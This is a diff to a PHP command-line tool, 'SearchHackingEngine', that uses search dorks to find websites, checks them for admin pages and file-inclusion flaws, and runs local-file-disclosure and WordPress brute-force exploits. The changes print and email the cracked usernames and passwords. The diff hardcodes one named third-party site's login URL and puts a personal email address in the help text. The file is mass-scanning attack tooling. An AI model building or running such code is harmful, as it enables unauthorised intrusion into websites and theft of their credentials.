@@ -97,8 +97,8 @@ class SearchHackingEngine extends Command
                     new InputOption(
                         'email',
                         null,
-                        InputOption::VALUE_NONE,
-                        'Set the mail for send result. Example: --email'),
+                        InputOption::VALUE_REQUIRED,
+                        'Set the mail for send result. Example: --email="lenonleite@gmail.com"'),
                     new InputOption(
                         'exploit',
                         null,
@@ -131,7 +131,8 @@ class SearchHackingEngine extends Command
             'torl' => $this->torl,
             'virginProxies' => $this->vp,
             'check' => $this->check,
-            'exploit' => $this->exploit,
+            'email' => $this->email,
+
         );
         $dorks = explode('||',$commandData['dork']);
         foreach($dorks as $dork){
@@ -198,8 +199,13 @@ class SearchHackingEngine extends Command
             $this->printResult($result, $output, 'Result list of Search:');
             $this->printResumeResult($output, 'Patch File of Search:', $file);
             if (!empty($this->check)) {
-                $this->checkVunerabilities($nameFile, $result, $commandData, $output);
+                $resultsOfCheck=$this->checkVunerabilities($nameFile, $result, $commandData, $output);
             }
+            if (!empty($this->exploit)) {
+                $this->checkExploits($resultsOfCheck,$commandData,$output);
+            }
+
+
 
             sleep(5);
         }
@@ -227,7 +233,7 @@ class SearchHackingEngine extends Command
         $this->torl = $input->getOption('torl');
         $this->check = $this->sanitazeValuesOfEnginers($input->getOption('check'));
         $this->pl = $input->getOption('pl');
-        $this->exploit = $input->getOption('exploit');
+        $this->exploit = explode(",",$input->getOption('exploit'));
     }
 
     private function runHelp($output)
@@ -288,7 +294,7 @@ class SearchHackingEngine extends Command
                     $msg .= $keyResultEnginer.' '.$result.' <br>';
                 }
             }
-            $mailer->sendMessage('you@example.com', $msg);
+            $mailer->sendMessage($this->email, $msg);
         }
     }
 
@@ -357,7 +363,8 @@ class SearchHackingEngine extends Command
         if (in_array('isAdmin', $this->check)) {
             $resultFinal = array();
             $nameFileIsAdmin = $nameFile.'_isAdmin';
-            $site = new Vulnerabilities\DefaultSite($commandData, $result);
+            $site = new DefaultSite($commandData, $result);
+            $resultFinal['isAdmin']="http://www.riojurua.com.br/wp-login.php";
             $resultFinal['isAdmin'] = $site->check();
             $this->saveTxt($resultFinal, $nameFileIsAdmin);
             $this->printResult($resultFinal, $output, 'Result list of admin page:');
@@ -383,12 +390,19 @@ class SearchHackingEngine extends Command
             $this->printResumeResult($output, 'Patch File of Local File Inclusion:', $nameFileLfi);
         }
 
-        if($this->exploit["lfd"]){
-            $this->runExploitLFD($resultFinal,$commandData,$output);
+        return $resultFinal;
+
+    }
+
+    protected function checkExploits($results,$commandData, OutputInterface $output){
+
+        if (in_array('lfd', $this->exploit)) {
+            $this->runExploitLFD($results,$commandData,$output);
         }
-        if($this->exploit["btwp"]){
-            $this->runExploitBTWP($resultFinal,$commandData,$output);
+        if (in_array('btwp', $this->exploit)) {
+            $this->runExploitBTWP($results,$commandData,$output);
         }
+
     }
 
     protected function runExploitLFD($result, $commandData, OutputInterface $output){
@@ -420,13 +434,19 @@ class SearchHackingEngine extends Command
         $output->writeln('');
         $btwp=new Exploits\BruteForceWordPress($commandData);
         foreach($result['isAdmin'] as $url){
-            $result=$btwp->execute($url);
+            $resBtwp['isAdmin']=$btwp->execute($url);
+            if($resBtwp){
+                $output->writeln('<info>********************Print Results***********************</info>');
+                $output->writeln("<info>Site: ".$resBtwp['isAdmin']['site']."</info>");
+                $output->writeln("<info>User: ".$resBtwp['isAdmin']['user']."</info>");
+                $output->writeln("<info><info>Password: ".$resBtwp['isAdmin']['password']."</info>");
+                $output->writeln('<info>********************************************************</info>');
+                if (!empty($this->email)) {
+                    $this->sendMail($resBtwp, $this->email);
+                    $this->printResumeResult($output, 'Email to send:', $this->email);
+                }
+            }
         }
-        $output->writeln('<info>********************Print Results***********************</info>');
-        foreach($result as $res){
-            $output->writeln("Site: ".$res['site']);
-            $output->writeln("User: ".$res['user']);
-            $output->writeln("Password: ".$res['password']);
-        }
+
     }
 }
